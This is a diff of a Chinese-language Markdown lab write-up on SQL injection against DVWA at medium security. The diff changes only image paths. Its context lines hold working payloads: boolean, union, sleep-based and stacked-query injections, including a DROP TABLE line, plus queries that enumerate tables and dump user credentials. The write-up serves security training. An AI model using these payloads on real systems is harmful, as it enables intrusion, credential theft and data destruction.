@@ -6,11 +6,11 @@
 
 原本的样子：
 
-<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_044542.png" style="zoom:50%;" />
+<img src="./imgs/20240914_044542.png" style="zoom:50%;" />
 
 借助工具看一下内容咯：
 
-![20240914_045128](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_045128.png)
+![20240914_045128](./imgs/20240914_045128.png)
 
 
 
@@ -27,7 +27,7 @@
 1 and 1 = 2
 ```
 
-<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_050859.png" alt="20240914_050859" style="zoom:67%;" />
+<img src="./imgs/20240914_050859.png" alt="20240914_050859" style="zoom:67%;" />
 
 
 
@@ -42,13 +42,13 @@
 
 
 
-![20240914_064909](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_064909.png)
+![20240914_064909](./imgs/20240914_064909.png)
 
-![20240914_065155](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_065155.png)
+![20240914_065155](./imgs/20240914_065155.png)
 
 ## 方法2：基于报错的检测方法（有错误返回）
 
-![20240914_064909](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_064909.png)
+![20240914_064909](./imgs/20240914_064909.png)
 
 
 
@@ -58,7 +58,7 @@
 union select 1 #
 ```
 
-<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_051850.png" alt="20240914_051850" style="zoom:67%;" />
+<img src="./imgs/20240914_051850.png" alt="20240914_051850" style="zoom:67%;" />
 
 ## 方法4: 基于时间的盲测的检测（时间函数sleep）
 
@@ -66,7 +66,7 @@ union select 1 #
 'and (select * from (select(sleep(20)))a)--+
 ```
 
-<img src="C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_052130.png" alt="20240914_052130" style="zoom:50%;" />
+<img src="./imgs/20240914_052130.png" alt="20240914_052130" style="zoom:50%;" />
 
 ## 方法5:基于叠对查询的检测（；）
 
@@ -76,7 +76,7 @@ union select 1 #
 1'; DROP TABLE users; -- 
 ```
 
-![20240914_052453](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_052453.png)
+![20240914_052453](./imgs/20240914_052453.png)
 
 # 第三步：推测后台查询语句
 
@@ -103,9 +103,9 @@ id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FR
 根据查询在第二列与第三列之前的存在错误的临界点，说明最大显示位位第二列
 ```
 
-![20240914_070925](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_070925.png)
+![20240914_070925](./imgs/20240914_070925.png)
 
-![20240914_071418](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_071418.png)
+![20240914_071418](./imgs/20240914_071418.png)
 
 ## 方式2：根据联合查询：union select
 
@@ -116,9 +116,9 @@ id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FR
 列数不断增加，显示为一共为2列
 ```
 
-![20240914_071908](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_071908.png)
+![20240914_071908](./imgs/20240914_071908.png)
 
-![20240914_072139](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072139.png)
+![20240914_072139](./imgs/20240914_072139.png)
 
 
 
@@ -130,7 +130,7 @@ id=-1 union select 1,(SELECT GROUP_CONCAT(user,password SEPARATOR 0x3c62723e) FR
 id=1 union select 1, version() %23
 ```
 
-![20240914_072541](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072541.png)
+![20240914_072541](./imgs/20240914_072541.png)
 
 
 
@@ -140,7 +140,7 @@ id=1 union select 1, version() %23
 1 union select 1,database() %23
 ```
 
-![20240914_072859](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_072859.png)
+![20240914_072859](./imgs/20240914_072859.png)
 
 
 
@@ -152,7 +152,7 @@ id=1 union select 1, version() %23
 1 union select 1, group_concat(table_name) from information_schema.tables where table_schema = database() %23
 ```
 
-![20240914_073941](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_073941.png)
+![20240914_073941](./imgs/20240914_073941.png)
 
 
 
@@ -162,13 +162,13 @@ id=1 union select 1, version() %23
 1 union select (table_name collate utf8_unicode_ci),(table_schema collate utf8_unicode_ci) from information_schema.tables %23
 ```
 
-![20240914_075533](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_075533.png)
+![20240914_075533](./imgs/20240914_075533.png)
 
 
 
 ## 统计源数据库的数据库表数量
 
-![20240914_075119](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_075119.png)
+![20240914_075119](./imgs/20240914_075119.png)
 
 
 
@@ -180,7 +180,7 @@ id=1 union select 1, version() %23
 1 union select 1, group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = 0x7573657273 %23
 ```
 
-![20240914_084227](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_084227.png)
+![20240914_084227](./imgs/20240914_084227.png)
 
 
 
@@ -190,7 +190,4 @@ id=1 union select 1, version() %23
 1 union select 1, concat_ws(':',user_id,first_name,last_name,user,password,avatar,last_login,failed_login) from users %23
 ```
 
-![20240914_084843](C:\Users\Administrator\Desktop\rangetest\web_dvwa\sql\sql注入\medium\imgs\20240914_084843.png)
-
-
-
+![20240914_084843](./imgs/20240914_084843.png)
